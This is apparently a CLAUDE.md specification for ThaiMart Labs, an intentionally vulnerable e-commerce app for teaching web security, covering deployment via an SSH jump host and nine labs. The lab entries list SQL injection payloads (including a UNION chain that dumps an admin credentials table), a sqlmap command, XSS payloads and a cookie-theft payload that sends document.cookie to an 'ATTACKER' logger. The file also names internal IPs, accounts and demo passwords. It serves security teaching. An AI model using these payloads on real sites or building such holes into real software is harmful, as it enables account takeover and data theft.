# ThaiMart Labs - Project Specification

## Overview

**ThaiMart** is a fictional Thai e-commerce platform used as the theme for cybersecurity education labs. Students practice web security concepts in a realistic environment.

**Slogan:** ช้อปสนุก ส่งไว ทั่วไทย

**Repository:** https://github.com/phwrscr1pt/WEBlab.git

**Status:** ✅ Deployed and Running

## Tech Stack

| Component | Technology |
|-----------|------------|
| Runtime | Node.js 20 |
| Framework | Express 4 |
| Database | PostgreSQL 16 |
| Templates | EJS |
| Container | Docker Compose |

---

## Deployment

- **Server:** HPE ProLiant Gen 9 (Proxmox VM)
- **OS:** Ubuntu 22.04 Desktop
- **Method:** Docker containers

### Lab VM Details

| Item | Value |
|------|-------|
| VM Name | `weblab` |
| VM IP | `10.10.61.87` |
| VM User | `asdf` |
| SSH Auth | SSH Key (no password) |
| Gateway | `10.10.61.4` |
| Interface | `enp6s18` |

### Network Topology

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              INTERNET                                        │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    │ Tailscale VPN
                                    ▼
┌─────────────────────┐      ┌─────────────────────┐      ┌─────────────────────┐
│   Claude's Machine  │      │    Jump Host        │      │   ThaiMart Lab VM   │
│   (Windows)         │ ───► │    (root-agent)     │ ───► │     (weblab)        │
│                     │      │                     │      │                     │
│   Can reach:        │ SSH  │   IP: 100.107.182.15│ SSH  │   IP: 10.10.61.87   │
│   - Tailscale IPs   │      │   User: root-agent  │      │   User: asdf        │
│   - Internet        │      │                     │      │                     │
│                     │      │   Can reach:        │      │   Services:         │
│   Cannot reach:     │      │   - 10.10.61.x LAN  │      │   - Web: port 80    │
│   - 10.10.61.x LAN  │      │   - Internet        │      │   - Logger: /logger │
│                     │      │   - Tailscale       │      │   - DB: internal    │
└─────────────────────┘      └─────────────────────┘      └─────────────────────┘
```

### SSH Access

```bash
# Direct command (via jump host)
ssh -J root-agent@100.107.182.15 asdf@10.10.61.87

# Run command on lab VM
ssh -J root-agent@100.107.182.15 asdf@10.10.61.87 "docker-compose ps"

# SSH Config (~/.ssh/config) for easy access
Host thaimart-lab
    HostName 10.10.61.87
    User asdf
    ProxyJump root-agent@100.107.182.15

# Then simply:
ssh thaimart-lab
```

### Access URLs

| Service | URL |
|---------|-----|
| Homepage (Hub) | http://10.10.61.87 |
| Cookie Logger | http://10.10.61.87/logger |
| Lab 01 - HTTP Methods | http://10.10.61.87/lab01 |
| Lab 02 - Member Login | http://10.10.61.87/lab02 |
| Lab 03 - SQL Playground | http://10.10.61.87/lab03 |
| Lab 04 - Seller Portal (SQLi) | http://10.10.61.87/lab04 |
| Lab 05 - Staff Directory (SQLi) | http://10.10.61.87/lab05 |
| Lab 06 - Categories (SQLmap) | http://10.10.61.87/lab06?id=1 |
| Lab 07 - Product Search (XSS) | http://10.10.61.87/lab07 |
| Lab 08 - Member Search (XSS) | http://10.10.61.87/lab08 |
| Lab 09 - Reviews (Stored XSS) | http://10.10.61.87/lab09 |

### Quick Deploy

```bash
# On Lab VM
cd ~/ThaiMart-Labs
git pull
sudo docker-compose up -d

# Or remotely via jump host
ssh -J root-agent@100.107.182.15 asdf@10.10.61.87 "cd ~/ThaiMart-Labs && git pull && sudo docker-compose up -d"
```

## Color Scheme

```css
:root {
  --primary: #f97316;      /* Orange - ThaiMart brand */
  --primary-dark: #c2410c;
  --secondary: #1e3a5f;    /* Navy */
  --background: #f8fafc;
  --text-dark: #1a1a1a;
  --text-muted: #6b7280;
  --border: #e5e7eb;
  --success: #16a34a;
  --danger: #dc2626;
}
```

## Project Structure

```
ThaiMart-Labs/
├── CLAUDE.md               # This file
├── README.md               # Setup instructions
├── docker-compose.yml      # Docker orchestration
├── Dockerfile              # Node.js image
├── package.json            # Dependencies
├── .gitignore
├── .env.example
│
├── src/
│   ├── app.js              # Express entry point
│   │
│   ├── routes/
│   │   ├── index.js        # Hub page
│   │   ├── lab01.js        # HTTP Methods
│   │   ├── lab02.js        # Stateless Demo
│   │   ├── lab03.js        # SQL Playground
│   │   ├── lab04.js        # Auth Bypass (SQLi)
│   │   ├── lab05.js        # Union SQLi
│   │   ├── lab06.js        # SQLmap Target
│   │   ├── lab07.js        # Reflected XSS
│   │   ├── lab08.js        # Cookie Stealing
│   │   ├── lab09.js        # Stored XSS
│   │   └── logger.js       # Cookie catcher
│   │
│   ├── views/
│   │   ├── layout.ejs
│   │   ├── hub.ejs
│   │   ├── 404.ejs
│   │   ├── error.ejs
│   │   └── labs/
│   │       ├── lab01.ejs
│   │       ├── lab02-*.ejs
│   │       ├── lab03.ejs
│   │       ├── lab04-*.ejs
│   │       ├── lab05.ejs
│   │       ├── lab06.ejs
│   │       ├── lab07.ejs
│   │       ├── lab08-*.ejs
│   │       ├── lab09.ejs
│   │       └── logger.ejs
│   │
│   └── public/
│       ├── css/style.css
│       └── js/main.js
│
└── database/
    └── init.sql            # Schema + seed data
```

## Labs Detail

### Lab 01: HTTP Methods
- **Path:** `/lab01`
- **Story:** ThaiMart Developer Portal - API Tester
- **Concept:** GET, POST, PUT, DELETE methods
- **Vulnerable:** No

### Lab 02: Stateless Demo
- **Path:** `/lab02`
- **Story:** ThaiMart Member Login
- **Credentials:** user1 / password123
- **Concept:** Cookies, session, stateless HTTP
- **Vulnerable:** No

### Lab 03: SQL Playground
- **Path:** `/lab03`
- **Story:** Employee DB Explorer (Internal)
- **Concept:** SQL commands (SELECT, INSERT, UPDATE, DELETE)
- **Vulnerable:** No (educational only)

### Lab 04: Auth Bypass
- **Path:** `/lab04`
- **Story:** ThaiMart Seller Portal
- **Credentials:** seller1 / securepass99
- **Vulnerable:** YES - SQL Injection
- **Attack:** `' OR '1'='1` or `admin'--`

### Lab 05: Union-Based SQLi
- **Path:** `/lab05`
- **Story:** Staff Directory Search
- **Vulnerable:** YES - Union SQL Injection
- **Attack Path:**
  1. `' ORDER BY 4--` (find columns)
  2. `' UNION SELECT 1,2,3,4--` (display columns)
  3. `' UNION SELECT 1,version(),3,4--` (DB version)
  4. `' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=current_schema()--`
  5. `' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='admin_credentials'--`
  6. `' UNION SELECT 1,username,password_hash,role FROM admin_credentials--`
- **Hidden Data:** admin_credentials table with superadmin account

### Lab 06: SQLmap Target
- **Path:** `/lab06?id=1`
- **Story:** Product Category Page
- **Vulnerable:** YES - Numeric SQL Injection
- **Attack:** `sqlmap -u "http://TARGET/lab06?id=1" --dbs`
- **Hidden Data:** secret_orders table with fake credit cards

### Lab 07: Reflected XSS
- **Path:** `/lab07`
- **Story:** Product Search
- **Vulnerable:** YES - Reflected XSS
- **Attack:** `<script>alert(1)</script>`

### Lab 08: Cookie Stealing
- **Path:** `/lab08`
- **Story:** Member Search
- **Credentials:** member1 / 1234
- **Vulnerable:** YES - Reflected XSS + Cookie Theft
- **Attack:** `<img src=x onerror="fetch('http://ATTACKER/logger/catch?c='+document.cookie)">`

### Lab 09: Stored XSS
- **Path:** `/lab09`
- **Story:** Product Reviews
- **Vulnerable:** YES - Stored XSS
- **Attack:** Submit review with `<script>alert('XSS')</script>`

### Logger (Cookie Catcher)
- **Path:** `/logger`
- **Endpoint:** `GET /logger/catch?c=COOKIE`
- **Purpose:** Students' attacker server for XSS labs

## Database Tables

- `playground_products` - Lab 03
- `seller_accounts` - Lab 04
- `staff` - Lab 05
- `admin_credentials` - Lab 05 (secret)
- `categories` - Lab 06
- `category_products` - Lab 06
- `secret_orders` - Lab 06 (secret)
- `search_products` - Lab 07
- `reviews` - Lab 09

## Commands

```bash
# Local Development
docker-compose up -d
docker-compose logs -f web

# Reset database
docker-compose down -v && docker-compose up -d

# Rebuild
docker-compose up -d --build

# Deploy to Lab VM (from local machine)
ssh -J root-agent@100.107.182.15 asdf@10.10.61.87 "cd ~/ThaiMart-Labs && git pull && sudo docker-compose up -d"

# View logs on Lab VM
ssh -J root-agent@100.107.182.15 asdf@10.10.61.87 "cd ~/ThaiMart-Labs && sudo docker-compose logs -f"

# Reset Lab VM database
ssh -J root-agent@100.107.182.15 asdf@10.10.61.87 "cd ~/ThaiMart-Labs && sudo docker-compose down -v && sudo docker-compose up -d"

# Check container status
ssh -J root-agent@100.107.182.15 asdf@10.10.61.87 "cd ~/ThaiMart-Labs && sudo docker-compose ps"
```

---

## Security Notes

**INTENTIONALLY VULNERABLE - EDUCATIONAL USE ONLY**

- Deploy only on isolated networks
- Never use in production
- Teach responsible disclosure

---

*Last Updated: 2026-04-18*
